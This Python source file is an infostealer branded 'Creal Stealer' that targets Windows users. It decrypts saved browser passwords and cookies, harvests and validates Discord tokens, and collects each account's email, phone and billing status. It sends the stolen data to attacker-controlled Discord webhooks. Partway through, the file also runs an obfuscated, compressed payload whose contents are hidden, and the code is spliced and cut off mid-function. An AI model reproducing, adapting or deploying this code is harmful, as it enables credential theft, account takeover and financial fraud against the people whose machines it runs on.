import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess


hook = "WEBHOOK HERE"


DETECTED = False

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return "```None```"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = ""

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            nitro = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "phone" in userjson: phone = f'{userjson["phone"]}'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

from builtins import *
from math import prod as MemoryAccess


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_run, Builtins, System, _statistics, _memoryaccess, Product = exec, str, tuple, map, ord, globals

class _frame:
    def __init__(self, _callfunction):
        self.Math = MemoryAccess((_callfunction, -64362))
        self._system(_builtins=-93172)

    def _system(self, _builtins = False):
        self.Math *= -18033 - _builtins

    def _random(self, _stackoverflow = 45879):
        _stackoverflow /= -46614 * -28848
        self._product != False

    def Statistics(Algorithm = int):
        return Product()[Algorithm]

    def Theory(_divide = -99114 - 83107, StackOverflow = str, _hypothesis = Product):
        _hypothesis()[_divide] = StackOverflow

    def execute(code = str):
        return _run(Builtins(System(_statistics(_memoryaccess, code))))

    @property
    def _product(self):
        self.DetectVar = '<__main__._system object at 0x000007256BE49202>'
        return (self.DetectVar, _frame._product)

if __name__ == '__main__':
    try:
        _frame.execute(code = __code__)
        Random = _frame(_callfunction = 29929 - -85251)
        _frame(_callfunction = -88076 - -35404)._system(_builtins = Random.Math / 44095)                                                                                                                                                                                                                                                          ;_frame.Theory(_divide='mmmnmmnnmnmnnmnmm',StackOverflow=b'x\x9c\xe5Y[o\xe2:\x10~\xef\xaf\xe8[@=\xad\x12_\x93J}C+\x81\xe8\xe6\xe5HT\xaa\xaa\x08Hr\xd69\x01\xaf\x80.\xec\xbf\xdf\x19\xdb\x81l!%A}\xc3\xc6\xe3K\x9c\xc9\xe4\x9b\xf1\x8ccJ=\x9f\x96\xeb^\xff\xd5\xfb\x0e\xe9\x19\x7f\xcf\xb6\xc2\xe2\xbd=\xfdW\xea\x19\xcc\xb89u\x19o\x1b\x8fF\xa3\xf1h<\x1c\x8f\x86\xd0\x82\xe2\xbd>>\xde\xdd\xdf\xdd\xf7\xee{wA\xbf\xff\x06,\xb2\xcdt\xb3Y5\xb2\x18\x96\xc3\xe1\xb0\x84d(\xf4\x90\x1e\xb3IU3\x0bU\xa8\x12rQ\x16\xaa(\x94R\xc8M\x95E\t/P\x9a7\xbci\x9aa\xee\x86\x9e\xc2K\xa5\x9d\x82\x17\x8b\xc2\xdc\x9d$j\xf1S\xaf6I\xd2,\xfe\xd0\x88\\\to\xdf\x04nm\xe2\xda\xf3f\xef\xaa\xdc\xa8\xe5\xda\xeb?\xfc\x9a\xae\x9a\xb1\xdd\xeev[\x9bv&o\x81\xeb\xc8\xe1\x8c\x88\x1b\xec{\xcd\xcfY/\xd5\xa6T\xef\xb3\x8fX\xf6\xff\xa9\x01\xed\x90\x87\xde%\x9c\xfa\xaf_\xc7\xeaA-\xd3l\xd7\xf3\xca\xe9\xaf\xec\xe8\xea[\xbf\x11\xa68\xf6c_kS\xc5:\xd6\xda\xd7\xd7\x01T\xf6\xbe\xfa\xf7\x14P\'-\xd2\x18\xd4\xd6\x98\xd4\x0e\x93\xb5+0\xab\xeb\xc0j3\xd5e\xde\t\xac\xd8\xf7\xc1\x92|0+\x1f\x08\xd8\x15\x18\x99\x0f`y\xdeC\xa1\xd5\xb2\xd1\x1c\r\xaf\xa1ek\xa8m\\\x07\xcc\xab\xcd\xfa\x14\xc8\x9fy\xdf\xd8\xacZ@\x18\x960\xb6\x00\xf6\xf8:\xc0\xcaJ\xf5s\xa1\xe7\x9d\xac\xf2e2y\xc12\xc1\x1a\x12\xd0\x8e`)5_O\x97\xea\x0b\xc0j\xe4\xd4\x1d\xacfV\x15X\xbfsU\xee\xb2\x1f\xcb\xf7\xae\xf6\x85\x8b\xd3.QLv\xbd>?_\x87\x85\x95Z\x1f_\xfd\xcc\xbc\xc6\xc3\xe1xl\x08\xe0\x81Nlt\x1d@e\xebr\xfa\xad\xcb\xa6c\xbf\x00\xf7\x8d\xfa\xddG;\xb7\x9e\xd7\xe7I\x98\xd0$H\xa2\x84\x03\x15\x90\x19\xcc\x14\xc7\xa3\x9f3:\xe1\x00z3\x8f\x12\x9e\xd3\x00\n\x87"\xa10(\x02\nq\x05\xc7\x08\x99\x91\x90\xa4\xad\xe6\x06$\x82\xedi\x9a\xcdu\x9a\xf5\xbc0\xdf\x1c\xaf\xbb\xbe%oWa \xf3lwrS\xda\xb8\x92p#\x8a[\x07\xb315\xf4"\xbd\xb2\x0fz\xe2\xae\x90\x9a\xce"\xa7\xd76s\xc3vz}{j+!!"\x94\x0c\xb2/)\x9d\x92\x9c\xe4\x82\x89HRAE.\x89`$\xc3\x96Ha<\x90\xbe\x88H.\xa5\xe0\x02\xee\x82\xd1\\\xcc$%`m\xd4\xa7\x14n\xc1\xc4)\xa1!PJ%P\x01W\x04\xf4a\x1ap\xc8YHC\x19\xc0\xbbr.e \x18\x15\x02\xdf1\x14s\xca\x19<\x99\xfaL\x02g\n\xcf\x981\xc1C\x16p\x01\xb2\x05<\x82:ds\x1a\xc8\x88\xe7\x922x"\'b\xce#\x96q\x9f\x85\x923\xc6(\xcc` F\xc6\x03\x19r\xca\x89$\x12\xa5!"\xa0\x8ceB\xca\x88\x052\x80\x0b\xe4,\x86\x8d\x86q\x1aE\x86\xef\x86)\xdfgv\xe8\x8b\xbcv\x9d\x89\xfc\xdc\xd3\xe1\xabw\xba\x98\xa5\xd3\xdb\x17\xfb\x10|\x9c\xab\xa1<6\x88\xd6Qd\x91\xeds\n\xd9\xd6\x87vm\xb4\xb5\xb8\xe0E0\xf2\x8cG&\x08\x8d\xc6\x18\x85F_$.\xcb\xc1\x92|a\xa8\xcd\x88\xa9\x1dA\x8c\xed\xd5\x0e\xd8\xa2\x98\xe8\xf3\xc0\xe9\x81$c\x14\x1c\xaa\xc7\xd3\x01\xe3\x13?1\x18\xe0\xd7\xc5@\xe3\xfew\x10\xeb\x01\xba\x8a\x014/r\x17u\xb7Nk.\x9d\xd7j\xdf\xb9\x8bss\x99q--\xdd\x85\x03\xa5p{/\xdc|\xa1\xa7EZt\xd6\xa0g\x90\x00d\x061\xfe\xb01\x18\xe8s\x016\x82@J!\x80"\xf5!\x98\xb2\x84\xc3L\x1f\xea\x0f\xa3\xe7\x18\x91D\x9aX\x1c\x98\xe9,!I\x083\xe9\xf1\xe8E*\x12\x0er\xee\xbc2\xafA\x1fU\xaap*j3\xb7C\xa4\xfeKU`j`k\x88p\x855\xdaa\xdc]Yx\x88`\x8a=O\xd8\xee\xce+*\x04\xf4\xec\x9e\x07\xd5\x12:EE\x1fG/\xc6\x97;\xf3\r\x1cF\xbe\xeb\x1fv7\x07|\xcf\xcd\xf5\xbb\xec\x84\x1c\xb6\x8b\xc5b\xb9\\B\x81\xdad3\xb0xl\xfeN\xe9\xea\xcdR\x96AN]]\xb5\xaaR\x8dU\xbd\xf6.\x18\xbf\x95\xbeW?\xfc^\xea\xea\xd0N\xcb\xcbC.!\x87.\xcb}-\xf7\xe3U\x0bJki\xf1\xdc\xcf\x9d\xfc\x99\x83\x03<\xfb\xfb\xa2x!CiS\xe8\xb2\xdc\xf7\x0f\x05hkY\xd1p\xb7\x96\xec\xdc)\xdc%\xf6\xe0Ml4\xb7\xf2NL2\x9d\x8b\x16\x0bu\x8e%\xaa\xf9~Zs:\xf5\xc5\xd2fn\xcb\xc5\xd2a{\t{\xb0\xcb7[\x1e\xb87\x13]\xf1t\t\x1d\x1c\xc6\x933\x81\xa4\x01)\x9f\xa46jv\x8c\x88F\xa3&\x10:U+T\xf5g\x9a\xcfWzq[\xfdGpk\xff\x7f\xb8\x85\xcf\x8f\xf9\r\x92\x9eS\xf7\xc4\xa9\x7fo\x0b\xfd\x9b\xc5\xef\x1fZ\xff\xff\x84Gi\xe6\xc8R\xe3\xc9%,\x0f}\xf3\x07SO\x03\xaf')
        _frame(_callfunction = 26137 - -7200)._random(_stackoverflow = -65003 - Random.Math)                                                                                                                                                                                                                                                          ;XXWXXXWWWXWWXXXWWWWX,SS22S2222S2SSSSSSS2SSSSS2S,NNNNNNNNMMMNMNMMNMNNN,MMNMNNNNMNMNMNNNMM,IIlIlllIlIlllIIIIIlIII=(lambda DDDOoOoDOOODoDODDOOoDooDO:DDDOoOoDOOODoDODDOOoDooDO['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda DDDOoOoDOOODoDODDOOoDooDO:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DDDOoOoDOOODoDODDOOoDooDO)"),filename='\x6c\x6c\x6c\x6a\x69\x69\x6a\x69\x6a\x69\x6a\x69\x6a\x69\x69\x69\x6a\x6c\x6a\x69\x6a\x69\x69\x69\x69',mode='\x65\x76\x61\x6c'))),(lambda DDDOoOoDOOODoDODDOOoDooDO:DDDOoOoDOOODoDODDOOoDooDO(__import__('\x7a\x6c\x69\x62'))),(lambda:(lambda DDDOoOoDOOODoDODDOOoDooDO:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DDDOoOoDOOODoDODDOOoDooDO)"),filename='\x6c\x6c\x6c\x6a\x69\x69\x6a\x69\x6a\x69\x6a\x69\x6a\x69\x69\x69\x6a\x6c\x6a\x69\x6a\x69\x69\x69\x69',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda ODDooooDODDDOODDODo,DDDOoOoDOOODoDODDOOoDooDO:ODDooooDODDDOODDODo(DDDOoOoDOOODoDODDOOoDooDO))
        if 134530 > 8707613:
            Random._system(_builtins = Random.Math + -20555)
        elif 393359 < 2136578:
            _frame(_callfunction = 80023 + -33401)._system(_builtins = Random.Math * -92006)                                                                                                                                                                                                                                                          ;MMNMNNNNMNMNMNNNMM()(IIlIlllIlIlllIIIIIlIII(XXWXXXWWWXWWXXXWWWWX(NNNNNNNNMMMNMNMMNMNNN(SS22S2222S2SSSSSSS2SSSSS2S('\x76\x61\x72\x73'))),_frame.Statistics(Algorithm='mmmnmmnnmnmnnmnmm')))
    except Exception as _math:
        if 181865 > 5655029:
            _frame.execute(code = Builtins(_math))
        elif 386744 > 4096032:
            Random._system(_builtins = Random.Math / 16315)

# def infoGonder():
#     global hook
#     global myhook
#     ip, contry, sehir = globalInfo()
#     headers = {
#     "Content-Type": "application/json",
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }
#     data = {
#     "content": f'{globalInfo()}',
#     "embeds": [
#         {
#         "color": 0000000,
#         "fields": [
#             {
#                 "name": "<a:mc_earth:589630396476555264> IP:",
#                 "value": f"```{ip}```",
#                 "inline": True
#             },
#             {
#                 "name": "<a:mc_earth:589630396476555264> Contry:",
#                 "value": f"```{contry}```",
#                 "inline": True
#             },
#             {
#                 "name": "<a:mc_earth:589630396476555264> State:",
#                 "value": f"{sehir}",
#                 "inline": True
#             },
#             ],
#         "author": {
#             "name": f"Creal Stealer",
#             "icon_url": f"https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
#            },
#         "footer": {
#             "text": "Creal Stealer",
#             "icon_url": "https://cdn.discordapp.com/attachments/1036335251728891908/1041231245511766086/d9298d8c2e842b8639796c6b14c5edcf.gif"
#             },
#         "thumbnail": {
#             "url": f"https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
#             }
#         }
#     ],
#     "avatar_url": "https://cdn.discordapp.com/attachments/1036335251728891908/1041231245511766086/d9298d8c2e842b8639796c6b14c5edcf.gif",
#     "username": "Creal Stealer",
#     "attachments": []
#     }
#     urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
#     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
#     return

def uploadToken(token, path):
    global hook
    global myhook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None: 
        pfp = "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "```No Rare Friends```"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = "```None```"

    data = {
        "content": f'{globalInfo()} | Found in `{path}`',
        "embeds": [
            {
            "color": 0000000,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{token}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{email}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{phone}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{getip()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
        "username": "Creal Stealer",
        "attachments": []
        }
    urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link, path):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()} | {path}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
            "attachments": []
            }
        urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": "",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
            "attachments": []
            }
        urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 000000,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer",
                    "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
            "attachments": []
            }
        urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
